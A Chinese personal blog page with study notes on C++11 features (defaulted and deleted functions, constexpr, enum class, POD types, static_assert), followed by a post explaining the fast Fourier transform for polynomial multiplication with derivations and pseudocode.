<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>()=<span class="keyword">default</span>;<span class="comment">//解决方法</span></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个构造函数不允许有函数体,其作用就相当于缺省构造函数</p>
<h2 id="delete关键字">delete关键字</h2>
<p>之前在一个C++类中,即使啥函数没写,编译器也会自动生成至少俩函数</p>
<p><code>operator=</code>和<code>copy ctor</code></p>
<p>然而我就不想让他生成这俩函数,禁止对象拷贝</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">in <span class="keyword">class</span> <span class="title class_">LinkedNode</span>:</span><br><span class="line">LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line"><span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure>
<p>此时主函数中想用一个节点拷贝另一个节点,编译报错</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221205948052.png"
alt="image-20221221205948052" />
<figcaption aria-hidden="true">image-20221221205948052</figcaption>
</figure>
<p>实际应用比如在basic_ostream中,delete用来禁用对char8_t*类型的流输出运算</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cpp_char8_t <span class="comment">// These deleted overloads are specified in P1423.</span></span></span><br><span class="line"><span class="comment">// don&#x27;t insert a UTF-8 NTBS</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="explicit关键字">explicit关键字</h2>
<p>explicit修饰的构造函数,不允许参数隐式类型转换</p>
<h2 id="constexpr关键字">constexpr关键字</h2>
<p>const和constexpr的区别</p>
<p>之前使用的const名为"常量"实际上是"常变量"</p>
<p>const修饰的变量和未经其修饰的变量只有源代码层面的级别,想要修改const变量会被编译器安全检查阻止.然而一旦通过了编译,到了汇编层面,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a=10</span><br><span class="line">const int b=10</span><br></pre></td></tr></table></figure>
<p>两者的底层存储没有任何区别</p>
<p>反汇编根本看不出const属性,顶多可以发现对b只有read操作,没有任何write操作</p>
<p>constexpr是真的常量</p>
<p>在编译阶段,编译器把所有能够计算得出的constexpr替换成字面量,constexpr修饰的函数会用其返回值字面量替换函数调用</p>
<p>实在计算不出来的,比如需要链接其他模块函数才能算出来的,编译器就会忽略constexpr修饰,视为普通变量或者函数</p>
<h2 id="enum-class">enum class</h2>
<p>之前的c++中,枚举类型实际上就是给int类型起了个别名</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;SOUTH&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译链接时会警告不同类的枚举相比较</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:14:15: warning: comparison between <span class="string">&#x27;enum Color&#x27;</span> and <span class="string">&#x27;enum Direction&#x27;</span> [-Wenum-compare]</span><br><span class="line">     <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">               ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">0  0</span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p>也就是说不同的枚举没有严格的类型区别</p>
<p>c++11就修正了这一点</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;Color::WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;Direction::SOUTH&lt;&lt;endl;<span class="comment">//不允许打印!&lt;&lt;没有重载Color::WHITE类型</span></span><br><span class="line">    <span class="keyword">if</span>(Color::WHITE==Direction::SOUTH)&#123;<span class="comment">//不允许比较!没有重载==运算符</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="非受限联合体">非受限联合体</h2>
<p>感觉用处不是很大,了解一下POD类型吧</p>
<h3 id="pod类型">POD类型</h3>
<p>Plain Old Data,平凡的老的数据</p>
<p>C的所有数据类型,包括基本数据类型和任何结构体,都是POD,</p>
<p>可以这样理解POD:其内存布局是很规则的,两个同类的POD之间可以直接用memcpy拷贝数据.啥意思呢?</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">&#125;Point;</span><br><span class="line">Point A;</span><br><span class="line">Point B;</span><br><span class="line">A.__x=<span class="number">10</span>;</span><br><span class="line">A.__y=<span class="number">20</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(B,A,<span class="built_in">sizeof</span>(B));</span><br><span class="line"><span class="comment">//此后B.__x=10,B.__y=20</span></span><br></pre></td></tr></table></figure>
<p>B和A是同类型的POD,那么A直接拷贝给B,A的第一个字节给B的第一个字节,A的第二个字节给B的第二个字节...显然组装起来的B,其前四个字节就是<code>__x</code>,后四个字节就是__y`,毋庸置疑的</p>
<p>c++11中可以使用<code>std::is_trivial&lt;T&gt;::value</code>来检查一个类型是否是POD</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">STRUCTPOINT</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">STRUCTPOINT</span>()=<span class="keyword">default</span>;<span class="comment">//有缺省构造函数仍然是POD</span></span><br><span class="line">&#125;Point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyPoint</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">MyPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;&#125;<span class="comment">//有非缺省构造函数,不是POD</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;Point&gt;::value&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;MyPoint&gt;::value&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; g++ -std=c+<span class="number">+11</span> main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; ./main</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>如果一个类有非缺省构造函数,或者有虚函数,虚基类,或者成员变量有不同的访问修饰或者第一个成员不是自己的,或者有父类并且父类本类都有成员变量,他就是非POD</p>
<p>这一点好理解</p>
<p>有虚函数的类,其基地址开始的4个字节是虚表指针,不是其成员,使用memcpy也会拷贝虚表指针</p>
<h2 id="assertion">assertion</h2>
<p>编译阶段的断言</p>
<p><code>static_assert(bool,string_literal)</code>如果前面的bool表达式为真,则通过编译</p>
<p>否则报告后面的字符串字面量,然后终止编译</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">static_assert</span>(<span class="literal">true</span>,<span class="string">&quot;字符串字面量&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样可以通过编译,啥也不会发生</p>
<p>如果这样写就不让通过:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221214450658.png"
alt="image-20221221214450658" />
<figcaption aria-hidden="true">image-20221221214450658</figcaption>
</figure>
<h2 id="正则表达式">正则表达式</h2>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/" class="post-title-link" itemprop="url">傅里叶变换</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-19 21:52:00" itemprop="dateCreated datePublished" datetime="2022-12-19T21:52:00+08:00">2022-12-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-22 01:59:33" itemprop="dateModified" datetime="2024-09-22T01:59:33+08:00">2024-09-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="傅里叶变换">傅里叶变换</h1>
<p>一个欠了一年的帐,今天终于还上了</p>
<p><del>我根本不知道录音的基本原理</del></p>
<h2 id="onlg-n内求解多项式乘法"><span class="math inline">\(O(n\lg
n)\)</span>内求解多项式乘法</h2>
<p>算法导论上的傅里叶变换,是为了在<span class="math inline">\(O(n\lg
n)\)</span>时间内,解决多项式乘法</p>
<p>如果直接让两个多项式卷积,那么朴素方法复杂度显然是<span
class="math inline">\(O(n^2)\)</span></p>
<p>如何降复杂度呢?使用点值计算</p>
<p>线性代数上可以证明,一个n-1次多项式,可以在其图像上使用n个点唯一确定(插值方法)</p>
<p>也就是说,一个多项式<span
class="math inline">\(A(x)=\sum_{j=0}^{n-1}a_jx^j\)</span>可以用n个点表示</p>
<p>那么两个均为<span class="math inline">\(n-1\)</span>次的多项式<span
class="math inline">\(A(x),B(x)\)</span>,其乘积多项式就得是一个<span
class="math inline">\(2n-2\)</span>次多项式,需要<span
class="math inline">\(2n-2\)</span>个点唯一确定</p>
<p>显然从一个<span
class="math inline">\(n-1\)</span>次多项式上取n-1个点已经足够唯一确定这个多项式了,再取其他点就是冗余信息,对确定表达式没有影响,因此可以在<span
class="math inline">\(A(x),B(x)\)</span>上各取2n-2个点,计算这2n-2个点的积,这就得出了积多项式的点值表示</p>
<p>其中第i个点<span class="math inline">\(C(x_i,A(x_i)\times
B(x_i))\)</span>纵坐标为两个多项式在<span
class="math inline">\(x_0\)</span>处函数值的乘积</p>
<p>画在图上也就是:</p>
<p>普通乘法是我们之前使用的lowB方法,下面曲线救国nb,就求值和插值这两步是真nb,求值和插值为何是<span
class="math inline">\(O(n\lg n)\)</span>呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219191232000.png"
alt="image-20221219191232000" />
<figcaption aria-hidden="true">image-20221219191232000</figcaption>
</figure>
<p>使用之前学过的方法,这两步都是<span
class="math inline">\(O(n^2)\)</span>的,</p>
<p>求值时需要将<span
class="math inline">\(x_0,x_1...\)</span>以此带入<span
class="math inline">\(A(x)\)</span>一共n个自变量,每个自变量求值都是<span
class="math inline">\(O(n)\)</span>,因此总共<span
class="math inline">\(O(n^2)\)</span></p>
<p>插值时需要使用拉格朗日插值法,也是<span
class="math inline">\(O(n^2)\)</span></p>
<blockquote>
<p>拉格朗日插值公式: <span class="math display">\[
A(x)=\sum_{k=0}^{n-1}y_k\frac{\Pi_{j\neq k }(x-x_j)}{\Pi_{j\neq
k}(x_k-x_j)}
\]</span> 其中<span
class="math inline">\((x_0,y_0),(x_1,y_1),...,(x_n-1,y_n-1)\)</span>是多项式<span
class="math inline">\(A(x)\)</span>的点值表示</p>
<p>最外层这个求和已经是<span class="math inline">\(O(n)\)</span></p>
<p>用二维数组<span
class="math inline">\(M[k][j]=x_k-x_j\)</span>预处理分母,</p>
<p>分子预先先直接求出<span
class="math inline">\(F(x)=\Pi(x-x_j)\)</span></p>
<p>那么对于一个给定的k,分母就是n个数的积,<span
class="math inline">\(O(n)\)</span></p>
<p>分子就是<span class="math inline">\(F(x)/(x-x_j)\)</span>,<span
class="math inline">\(O(n)\)</span></p>
<p>乘上最外圈的<span class="math inline">\(O(n)\)</span>得到<span
class="math inline">\(O(n^2)\)</span></p>
<p>也就是说,之前使用的方法是<span
class="math inline">\(O(n^2)\)</span>的</p>
</blockquote>
<p>但是使用快速傅里叶变换这种吊法,就能给他降到<span
class="math inline">\(O(n\lg n)\)</span></p>
<p>怎么降的?选点值的时候有讲究</p>
<p>任意n个不同的点就可以确定一个n-1次表达式.</p>
<p>如果选n个单位复根,然后对系数向量<span
class="math inline">\((a_0,a_1,...,a_{n-1})\)</span>应用离散傅里叶变换DFT,就可以在<span
class="math inline">\(O(n\lg
n)\)</span>内完成求值,使用逆DFT变换就可以在<span
class="math inline">\(O(n\lg n)\)</span>完成插值</p>
<h2 id="单位复根儿">单位复根儿</h2>
<p>"n次单位复根"就是指满足<span
class="math inline">\(\omega^n=1\)</span>的负数<span
class="math inline">\(\omega\)</span>,注意是这个<span
class="math inline">\(\omega\)</span>,不带那个n次方,一定要注意上下角标</p>
<p>欧拉公式 <span class="math display">\[
e^{i\pi}+1=0
\]</span> 第k个n次单位复根是<span
class="math inline">\(\omega_k=e^{\frac{2\pi ik}{n}}\)</span></p>
<p>显然<span class="math inline">\(\omega_k^n=(e^{\frac{2\pi
ik}{n}})^n=e^{2\pi ik}=((e^{i\pi})^2)^k=((-1)^2)^k=1^k=1\)</span></p>
<p>n次单位复根儿恰好有n个,也就是<span
class="math inline">\(k=0,1,2,...,n-1\)</span></p>
<p>这n个画在复平面儿上是很整齐的,比如8次复根就长这样:</p>
<p>任何两个相邻的单位复根之间的角度都是固定的,<span
class="math inline">\(360/n=360/8\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219193558548.png"
alt="image-20221219193558548" />
<figcaption aria-hidden="true">image-20221219193558548</figcaption>
</figure>
<p>都落在复平面单位元上</p>
<p>显然8次复根只有8个,如果非要写第九个<span
class="math inline">\(\omega_8^9\)</span>,就和<span
class="math inline">\(\omega_8^0\)</span>重合了,</p>
<p>然后书上就说这是加法群<span
class="math inline">\((Z_8,+)\)</span>,确实是,除了装了个B对于解决问题没有帮助,甚至没有学过抽代的就蒙蔽了</p>
<h2 id="dft">DFT</h2>
<p>求n-1次多项式的点值表示时,就需要选取n个点<span
class="math inline">\((x_0,x_1,x,...,x_{n-1})\)</span>,然后求出各自的函数值<span
class="math inline">\((y_0,y_1,...,y_{n-1})\)</span></p>
<p>如果选取的n个点是n个富哥儿,那么此时有 <span class="math display">\[
y_k=A(\omega_n^k)=\sum_{j=0}^{n-1}a_j\omega _n^{jk}
\]</span> 以此得到的<span
class="math inline">\(\vec{y}=(y_0,y_1,...,y_{n-1})\)</span>叫做系数向量<span
class="math inline">\(\vec{a}=(a_0,a_1,...,a_{n-1})\)</span>的离散傅里叶变换,</p>
<p>记作<span class="math inline">\(\vec{y}=DFT_n(\vec{a})\)</span></p>
<p>笑死,这看上去不就是带入求值吗,选n个富哥有屁用啊?</p>
<p>如果用普通的带入求值,找n个富哥儿和找n个普通人儿没有区别.</p>
<p>富哥儿的作用不能浪费喽,他们和普通值又有啥区别呢?</p>
<p>这就是单位复根儿的几个性质</p>
<p>这几个性质在计算时会体现群论的对称性,这意味着,这n个富哥确实能够比n个普通值携带更多的信息</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219195023551.png"
alt="image-20221219195023551" />
<figcaption aria-hidden="true">image-20221219195023551</figcaption>
</figure>
</blockquote>
<h2 id="fft">FFT</h2>
<p>fast Fourier transform,快速傅里叶变换</p>
<p>在<span class="math inline">\(O(n\lg n)\)</span>内求解DFT的算法</p>
<p>也就是说,DFT并不是一个求解方法,只是娶了n个富哥作为点值表示</p>
<p>仍然可以使用带入求值这种<span
class="math inline">\(O(n^2)\)</span>的lowB算法求解</p>
<p>而FFT就是一种吊法</p>
<p>他这样变形:</p>
<p>首先n向上取整到最近的2的幂次,这样做是为了保证能够一直二分直到剩1项,反正多取点不会降低精度</p>
<p>后面的n默认就认为是2的幂次了 <span class="math display">\[
\begin{aligned}
A(x)&amp;=a_0+a_1x+a_2x^2+...+a_{n-1}x^{n-1}\\
&amp;=(a_0+a_2x^2+a_4x^4+...+a_{n-2}x^{n-2})+(a_1x+a_3x^3+a_5x^{5}+...+a_{n-1}x^{n-1})\\
&amp;=A^{[0]}(x^2)+xA^{[1]}(x^2)
\end{aligned}
\]</span> 也就是说将<span
class="math inline">\(A(x)\)</span>按照偶数项和奇数项分开,其中奇数项都提出一个x来,这样子多项式中的x都是偶数,可以提取<span
class="math inline">\(x^2\)</span>作为自变量,于是得到 <span
class="math display">\[
\begin{cases}
A^{[0]}(x)=a_0+a_2x+a_4x^2+...+a_{n-2}x^{\frac{n}{2}-1}\\
A^{[1]}(x)=a_1+a_3x+a_5x^2+...+a_{n-1}x^{\frac{n}{2}-1}
\end{cases}
\]</span> 时刻不要忘记在求什么,</p>
<p>我们现在已知的是<span
class="math inline">\(\vec{a}=(a_0,a_1,a_2,...,a_{n-1})\)</span>,<span
class="math inline">\(\vec{x}=(\omega_n^0,\omega_n^1,...,\omega_n^{n-1})\)</span></p>
<p>要求的是<span class="math inline">\(\vec
{y}=DFT_n(\vec{a})\)</span></p>
<p>现在可以这样算了: <span class="math display">\[
A(x_k)=A(\omega_{n}^k)=A^{[0]}(\omega^{2k}_n)+\omega^k_nA^{[1]}(\omega^{2k}_n)
\]</span> 注意到我们不容易计算<span
class="math inline">\(A(x)\)</span>是因为,它的项太多了,0次项,1次项等等一直到n-1次项,共n项</p>
<p>而现在对于一个<span
class="math inline">\(A^{[0]}(x)\)</span>他只有<span
class="math inline">\(\frac{n}{2}\)</span>项了,工作量直接下降到一半</p>
<p>以此递归,总会有个时候,<span
class="math inline">\(A(x)\)</span>只有一项,也就是0次项,也就是那个常数项,算也不用算直接返回了,和x没有关系了,和富哥没关系了</p>
<p>写出伪代码:</p>
<p>注意FFT函数的输入是目标多项式的系数向量,不是富哥,因为富哥是作为常数使用的,不需要参数传递</p>
<p>FFT函数输出的是<span
class="math inline">\(\vec{y}=DFT(\vec{a})\)</span>也就是和将n个富哥直接带入多项式求值得到的n个值相同,但是算法更好</p>
<blockquote>
<p>一定注意函数不是y=A(x),而是y=FFT(a)</p>
<p>一定要清楚函数在干什么</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">FFT</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a)</span></span>&#123;<span class="comment">//a是系数,返回y向量</span></span><br><span class="line">	n=a.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>==n)&#123;<span class="comment">//递归出口条件,只剩一项时,也就是那个常数项,直接返回此时的a,实际上是a[0]作为y[0]返回了y</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;;</span><br><span class="line">    Complex omega_n=e^(<span class="number">2</span>*pi*i/n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a0,a1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)a<span class="number">0.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">        <span class="keyword">else</span> a<span class="number">1.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> y0=<span class="built_in">FFT</span>(a0);</span><br><span class="line">    <span class="type">int</span> y1=<span class="built_in">FFT</span>(a1);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">y</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//一定注意此处上界是n/2</span></span><br><span class="line">        y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//容易理解</span></span><br><span class="line">       	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//想对困难</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面有一个<code>y[n/2+i]=y0[i]-pow(omega_n,i)*y1[i]</code>,怎么得到的呢?
<span class="math display">\[
\begin{aligned}
y[\frac{n}{2}+i]&amp;=A(\omega_n^{\frac{n}{2}+i})\\
&amp;=A^{[0]}(\omega_n^{n+2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{n+2i})\\
&amp;=A^{[0]}(\omega_n^{2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{2i})\\
&amp;=A^{[0]}(\omega_{\frac{n}{2}}^i)-\omega_n^{i}A^{[1]}(\omega_{\frac{n}{2}}^i)\\
&amp;=y_0[i]-\omega_{n}^i y_1[i]
\end{aligned}
\]</span>
<strong>这就体现出富哥和普通点的区别了</strong>,富哥的变换很灵活</p>
<p>从上面的伪代码可以看出,最底层的递归和自变量无关.</p>
<p>加速发生在这里,将工程量直接缩减到一半</p>
